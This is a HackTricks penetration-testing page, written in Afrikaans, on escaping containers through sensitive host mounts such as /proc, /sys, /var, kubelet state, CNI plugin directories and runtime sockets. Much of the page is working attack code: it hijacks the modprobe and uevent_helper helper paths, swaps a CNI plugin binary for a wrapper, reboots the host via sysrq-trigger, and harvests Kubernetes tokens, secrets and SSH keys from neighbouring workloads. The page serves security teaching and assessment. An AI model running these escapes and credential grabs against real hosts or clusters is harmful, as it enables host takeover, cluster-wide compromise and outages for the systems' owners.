# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Host mounts is een van die belangrikste praktiese container-escape-oppervlakke omdat hulle dikwels 'n noukeurig geïsoleerde process view terug laat ineenstort na direkte sigbaarheid van host resources. Die gevaarlike gevalle is nie beperk tot `/` nie. Bind mounts van `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, of device-related paths kan kernel controls, credentials, neighboring container filesystems, en runtime management interfaces blootstel.

Hierdie bladsy bestaan afsonderlik van die individuele protection pages omdat die abuse model cross-cutting is. 'n Writable host mount is gevaarlik deels weens mount namespaces, deels weens user namespaces, deels weens AppArmor of SELinux coverage, en deels weens watter presiese host path blootgestel is. Om dit as sy eie onderwerp te behandel maak die attack surface baie makliker om oor te redeneer.

## `/proc` Exposure

procfs bevat beide gewone process information en hoë-impak kernel control interfaces. 'n Bind mount soos `-v /proc:/host/proc` of 'n container view wat onverwags writable proc entries blootstel kan dus lei tot information disclosure, denial of service, of direkte host code execution.

High-value procfs paths sluit in:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Begin deur te kyk watter high-value procfs entries sigbaar of writable is:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Hierdie paths is om verskillende redes interessant. `core_pattern`, `modprobe`, en `binfmt_misc` kan host code-execution paths word wanneer hulle writable is. `kallsyms`, `kmsg`, `kcore`, en `config.gz` is kragtige reconnaissance sources vir kernel exploitation. `sched_debug` en `mountinfo` onthul process-, cgroup-, en filesystem-konteks wat kan help om die host-uitleg van binne die container te rekonstrueer.

Die praktiese waarde van elke path verskil, en om hulle almal te behandel asof hulle dieselfde impak het, maak triage moeiliker:

- `/proc/sys/kernel/core_pattern`
As dit writable is, is dit een van die hoogste-impak procfs paths omdat die kernel 'n pipe handler sal execute na 'n crash. 'n Container wat `core_pattern` na 'n payload kan wys wat in sy overlay of in 'n mounted host path gestoor is, kan dikwels host code execution verkry. Sien ook [read-only-paths.md](protections/read-only-paths.md) vir 'n toegewyde example.
- `/proc/sys/kernel/modprobe`
Hierdie path beheer die userspace helper wat deur die kernel gebruik word wanneer dit module-loading logic moet invoke. As dit vanaf die container writable is en in die host context geïnterpreteer word, kan dit nog 'n host code-execution primitive word. Dit is veral interessant wanneer dit gekombineer word met 'n manier om die helper path te trigger.
- `/proc/sys/vm/panic_on_oom`
Dit is gewoonlik nie 'n skoon escape primitive nie, maar dit kan memory pressure omskakel in host-wide denial of service deur OOM conditions in kernel panic behavior te verander.
- `/proc/sys/fs/binfmt_misc`
As die registration interface writable is, kan die attacker 'n handler vir 'n gekose magic value register en host-context execution verkry wanneer 'n ooreenstemmende file execute word.
- `/proc/config.gz`
Nuttig vir kernel exploit triage. Dit help bepaal watter subsystems, mitigations, en optional kernel features enabled is sonder om host package metadata nodig te hê.
- `/proc/sysrq-trigger`
Meestal 'n denial-of-service path, maar 'n baie ernstige een. Dit kan die host onmiddellik reboot, panic, of andersins ontwrig.
- `/proc/kmsg`
Onthul kernel ring buffer messages. Nuttig vir host fingerprinting, crash analysis, en in sommige environments vir leaking information wat nuttig is vir kernel exploitation.
- `/proc/kallsyms`
Waardevol wanneer leesbaar omdat dit exported kernel symbol information blootstel en kan help om address randomization assumptions tydens kernel exploit development te defeat.
- `/proc/[pid]/mem`
Dit is 'n direkte process-memory interface. As die target process bereikbaar is met die nodige ptrace-style conditions, kan dit die lees of wysiging van 'n ander process se memory toelaat. Die realistiese impak hang sterk af van credentials, `hidepid`, Yama, en ptrace restrictions, so dit is 'n kragtige maar voorwaardelike path.
- `/proc/kcore`
Onthul 'n core-image-style view van system memory. Die file is groot en ongemaklik om te gebruik, maar as dit betekenisvol readable is, dui dit op 'n swak blootgestelde host memory surface.
- `/proc/kmem` en `/proc/mem`
Historiese high-impact raw memory interfaces. Op baie moderne systems is hulle disabled of swaar restricted, maar as hulle teenwoordig en bruikbaar is, moet hulle as critical findings behandel word.
- `/proc/sched_debug`
Leak scheduling en task information wat host process identities kan blootstel selfs wanneer ander process views skoner lyk as wat verwag is.
- `/proc/[pid]/mountinfo`
Uiters nuttig om te rekonstrueer waar die container werklik op die host leef, watter paths overlay-backed is, en of 'n writable mount ooreenstem met host content of slegs met die container layer.

As `/proc/[pid]/mountinfo` of overlay details readable is, gebruik dit om die host path van die container filesystem te recover:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Hierdie opdragte is nuttig omdat 'n aantal host-execution-truuks vereis dat 'n pad binne die container omgeskakel word na die ooreenstemmende pad vanuit die host se perspektief.

### Full Example: `modprobe` Helper Path Abuse

As `/proc/sys/kernel/modprobe` vanaf die container skryfbaar is en die helper pad in die host-konteks geïnterpreteer word, kan dit herlei word na 'n attacker-beheerde payload:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Die presiese trigger hang af van die teiken en kernel-gedrag, maar die belangrike punt is dat 'n skryfbare helper-pad 'n toekomstige kernel helper-aanroep kan herlei na aanvaller-beheerde host-pad-inhoud.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

As die doel exploitability assessment is eerder as onmiddellike escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Hierdie opdragte help om te bepaal of nuttige simboolinligting sigbaar is, of onlangse kernel-boodskappe interessante status openbaar, en watter kernel-features of mitigations ingesluit is wanneer dit saamgestel word. Die impak is gewoonlik nie direkte escape nie, maar dit kan kernel-vulnerability triage skerp verkort.

### Full Example: SysRq Host Reboot

As `/proc/sysrq-trigger` skryfbaar is en die host-view bereik:
```bash
echo b > /proc/sysrq-trigger
```
Die effek is onmiddellike gas-herlaai. Dit is nie ’n subtiele voorbeeld nie, maar dit demonstreer duidelik dat procfs-blootstelling baie ernstiger kan wees as inligtingsonthulling.

## `/sys` Blootstelling

sysfs stel groot hoeveelhede kernel- en toestelstatus bloot. Sommige sysfs-paaie is hoofsaaklik nuttig vir fingerprinting, terwyl ander helper-uitvoering, toestelgedrag, security-module-konfigurasie of firmware-status kan beïnvloed.

Hoëwaarde sysfs-paaie sluit in:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Hierdie paadjies is om verskillende redes belangrik. `/sys/class/thermal` kan thermal-management-gedrag beïnvloed en dus gasstabiliteit in sleg blootgestelde omgewings. `/sys/kernel/vmcoreinfo` kan crash-dump- en kernel-layout-inligting uitlek wat help met laevlak gas-fingerprinting. `/sys/kernel/security` is die `securityfs`-koppelvlak wat deur Linux Security Modules gebruik word, so onverwagte toegang daar kan MAC-verwante status blootstel of verander. EFI-veranderlike-paaie kan firmware-gebaseerde boot-instellings beïnvloed, wat hulle baie ernstiger maak as gewone konfigurasielêers. `debugfs` onder `/sys/kernel/debug` is veral gevaarlik omdat dit doelbewus ’n ontwikkelaar-georiënteerde koppelvlak is met baie minder veiligheidsverwagtinge as geharde produksie-gerigte kernel-APIs.

Nuttige hersieningsopdragte vir hierdie paadjies is:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Wat daardie opdragte interessant maak:

- `/sys/kernel/security` kan onthul of AppArmor, SELinux, of ’n ander LSM-oppervlak sigbaar is op ’n manier wat host-only moes gebly het.
- `/sys/kernel/debug` is dikwels die mees kommerwekkende bevinding in hierdie groep. As `debugfs` gemount en leesbaar of skryfbaar is, verwag ’n wye kernel-facing oppervlak waarvan die presiese risiko afhang van die geaktiveerde debug nodes.
- EFI veranderlike blootstelling is minder algemeen, maar as dit teenwoordig is, is dit hoog impak omdat dit firmware-backed instellings raak eerder as gewone runtime files.
- `/sys/class/thermal` is hoofsaaklik relevant vir host stability en hardware interaction, nie vir ’n netjiese shell-style escape nie.
- `/sys/kernel/vmcoreinfo` is hoofsaaklik ’n host-fingerprinting en crash-analysis bron, nuttig om laevlak kernel state te verstaan.

### Full Example: `uevent_helper`

As `/sys/kernel/uevent_helper` skryfbaar is, kan die kernel ’n attacker-controlled helper uitvoer wanneer ’n `uevent` getrigger word:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Die rede waarom dit werk, is dat die helper-pad vanuit die gasheer se oogpunt geïnterpreteer word. Sodra dit geaktiveer is, loop die helper in die gasheer-konteks eerder as binne die huidige container.

## `/var` Exposure

Om die gasheer se `/var` in 'n container te mount, word dikwels onderskat omdat dit nie so dramaties lyk soos om `/` te mount nie. In die praktyk kan dit genoeg wees om toegang te kry tot runtime sockets, container snapshot directories, kubelet-beheerde pod-volumes, projected service-account tokens, en naburige application filesystems. Op moderne nodes is `/var` dikwels waar die mees operasioneel interessante container state eintlik leef.

### Kubernetes Example

'n pod met `hostPath: /var` kan dikwels ander pods se projected tokens en overlay snapshot content lees:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Hierdie opdragte is nuttig omdat hulle antwoord of die mount net vervelige toepassingsdata of hoë-impak cluster credentials blootstel. ’n Leesbare service-account token kan plaaslike code execution onmiddellik in Kubernetes API access verander.

As die token teenwoordig is, bevestig wat dit kan bereik in plaas daarvan om by token discovery te stop:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Die impak hier kan baie groter wees as plaaslike node-toegang. ’n Token met breë RBAC kan ’n gemonteerde `/var` in ’n cluster-wye compromise verander.

### Docker And containerd Example

Op Docker hosts is die relevante data dikwels onder `/var/lib/docker`, terwyl dit op containerd-backed Kubernetes nodes onder `/var/lib/containerd` of snapshotter-spesifieke paths kan wees:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
As die gemonteerde `/var` skryfbare snapshot-inhoud van `n ander workload blootstel, kan die aanvaller moontlik toepassingslêers verander, webinhoud plant, of opstart-skripte wysig sonder om die huidige container-konfigurasie aan te raak.

Konkreet misbruik-idees sodra skryfbare snapshot-inhoud gevind is:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Hierdie commands is nuttig omdat hulle die drie hoof-impakfamilies van gemounte `/var` wys: application tampering, secret recovery, en lateral movement in naburige workloads.

## Kubelet State, Plugins, And CNI Paths

'n Mount van `/var/lib/kubelet`, `/opt/cni/bin`, of `/etc/cni/net.d` word dikwels blootgestel deur privileged DaemonSets, CNI agents, CSI node plugins, GPU operators, en storage helpers. Hierdie mounts is maklik om af te skryf as "node plumbing", maar hulle sit direk in die execution path vir nuwe pods en bevat dikwels kubelet credentials, projected secrets, registration sockets, en executable host-side plugin binaries.

High-value targets sluit in:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Nuttige review commands is:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Waarom hierdie paths saak maak:

- `/var/lib/kubelet/pki` kan kubelet client certificates en ander node-local credentials blootstel wat soms teen die API server of kubelet-facing TLS endpoints hergebruik kan word, afhangend van cluster design.
- `/var/lib/kubelet/pods` bevat dikwels projected service-account tokens en gemounte Secrets vir naburige pods op dieselfde node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` is hoofsaaklik ’n reconnaissance surface, maar ’n baie nuttige een: dit wys watter pods en containers tans GPUs, hugepages, SR-IOV devices en ander skaars node-local resources besit.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, en `/var/lib/kubelet/plugins_registry` wys watter CSI, DRA, en device plugins geïnstalleer is en met watter sockets die kubelet verwag om te praat. As daardie directories writable is eerder as bloot readable, word die finding baie ernstiger.
- `/opt/cni/bin` en `/etc/cni/net.d` sit direk op die pod-network setup path. Writable access daar is dikwels ’n delayed host-execution primitive eerder as net configuration exposure.

### Full Example: Writable `/opt/cni/bin`

As ’n host CNI binary directory read-write gemounte is, kan die vervanging van ’n plugin genoeg wees om host execution te verkry die volgende keer wat die kubelet ’n pod sandbox op daardie node skep:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Dit is nie so onmiddellik soos ’n gemonteerde `docker.sock` nie, maar dit is dikwels meer realisties in gekompromitteerde Kubernetes-infrastruktuur-pods. Die belangrike punt is dat die gewysigde binary later deur die host network setup flow uitgevoer word, nie deur die huidige container nie.


## Runtime Sockets

Sensitive host mounts sluit dikwels runtime sockets in eerder as volledige directories. Dit is so belangrik dat dit hier eksplisiete herhaling verdien:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Sien [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) vir volledige uitbuitingsvloei sodra een van hierdie sockets gemonteer is.

As 'n vinnige eerste interaksiepatroon:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
As een van hierdie slaag, is die pad van "mounted socket" na "start a more privileged sibling container" gewoonlik baie korter as enige kernel breakout pad.

## Mount-Related CVEs

Host mounts kruis ook met runtime vulnerabilities. Belangrike onlangse voorbeelde sluit in:

- `CVE-2024-21626` in `runc`, waar ’n gelek directory file descriptor die working directory op die host filesystem kon plaas.
- `CVE-2024-23651`, `CVE-2024-23652`, en `CVE-2024-23653` in BuildKit, waar malicious Dockerfiles, frontends, en `RUN --mount` flows host file access, deletion, of elevated privileges tydens builds kon herintroduceer.
- `CVE-2024-1753` in Buildah en Podman build flows, waar crafted bind mounts tydens build `/` read-write kon blootstel.
- `CVE-2025-47290` in `containerd` 2.1.0, waar ’n TOCTOU tydens image unpack ’n specially crafted image kon laat toe om die host filesystem tydens pull te modify.

Hierdie CVEs maak hier saak omdat dit wys dat mount handling nie net oor operator configuration gaan nie. Die runtime self kan ook mount-driven escape conditions introduceer.

## Checks

Gebruik hierdie commands om die mount exposures met die hoogste waarde vinnig op te spoor:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Wat hier interessant is:

- Host root, `/proc`, `/sys`, `/var`, en runtime sockets is alles hoë-prioriteit bevindings.
- Skryfbare proc/sys-inskrywings beteken dikwels dat die mount host-globale kernel controls blootstel eerder as `n veilige container view.
- Gemounte `/var`-paaie verdien credential- en neighboring-workload review, nie net filesystem review nie.
- Kubelet state directories en CNI/plugin-paaie verdien dieselfde prioriteit as runtime sockets, omdat hulle dikwels direk op die node se pod-creation- en credential-distribution-pad sit.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
